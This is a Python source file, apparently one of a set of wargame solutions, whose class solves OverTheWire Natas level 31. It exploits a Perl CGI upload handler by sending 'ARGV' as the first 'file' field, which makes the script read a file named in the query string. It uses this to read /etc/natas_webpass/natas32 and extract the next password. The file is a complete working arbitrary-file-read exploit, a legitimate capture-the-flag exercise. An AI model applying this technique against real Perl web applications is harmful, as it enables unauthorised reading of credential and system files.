
import re
from src.natas.base_level import NatasLevel


class Level_31(NatasLevel):

    num = 31
    explanation = "On this level, we send `ARGV` as the first `file` parameter before the CSV upload.\n     Perl treats `ARGV` as a filehandle and reads the file specified in the query string."

    def exploit(self) -> str:
        url = f"{self.base_url}/index.pl"

        csv_content = b"1,2,\n3,4,\n"

        files = [
            ("file", (None, "ARGV")),
            ("file", ("test.csv", csv_content, "text/csv")),
        ]

        data = {"submit": "Upload"}

        resp = self.session.post(
            f"{url}?/etc/natas_webpass/natas32",
            files=files,
            data=data,
        )

        match = re.search(r"[A-Za-z0-9]{32}", resp.text)
        if not match:
            raise ValueError("Could not find the natas32 password")

        return match.group(0)
